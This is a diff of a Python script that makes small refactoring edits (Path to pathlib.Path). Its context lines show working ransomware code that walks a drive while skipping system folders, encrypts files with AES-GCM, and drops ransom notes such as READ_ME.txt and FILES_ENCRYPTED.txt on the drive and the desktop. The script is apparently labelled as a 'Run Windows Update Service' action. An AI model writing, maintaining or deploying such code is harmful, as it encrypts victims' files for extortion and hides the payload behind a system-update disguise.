@@ -539,7 +539,7 @@ action=Run Windows Update Service
         aesgcm = AESGCM(key)
 
         # Encryption function
-        def encrypt_file(file_path: Path):
+        def encrypt_file(file_path: pathlib.Path):
             try:
                 if file_path.suffix == ".enc":
                     return
@@ -553,17 +553,17 @@ action=Run Windows Update Service
                 pass
 
         # Gather files
-        def gather_files(drive: Path):
+        def gather_files(drive: pathlib.Path):
             skip_dirs = {"Windows", "Program Files", "Program Files (x86)", "$Recycle.Bin", "System Volume Information"}
             files = []
             for root, dirs, filenames in os.walk(drive):
                 dirs[:] = [d for d in dirs if d not in skip_dirs]
                 for f in filenames:
-                    files.append(Path(root) / f)
+                    files.append(pathlib.Path(root) / f)
             return files
 
         # Target the D:/Hello directory for ransomware
-        drive = Path("D:/Hello")
+        drive = pathlib.Path("D:/Hello")
         if drive.exists():
             all_files = gather_files(drive)
             
@@ -579,7 +579,7 @@ action=Run Windows Update Service
             # Save ransom note to multiple locations
             note_locations = [
                 drive / "READ_ME.txt",
-                Path(os.path.expanduser("~/Desktop")) / "FILES_ENCRYPTED.txt"
+                pathlib.Path(os.path.expanduser("~/Desktop")) / "FILES_ENCRYPTED.txt"
             ]
             
             for note_path in note_locations:
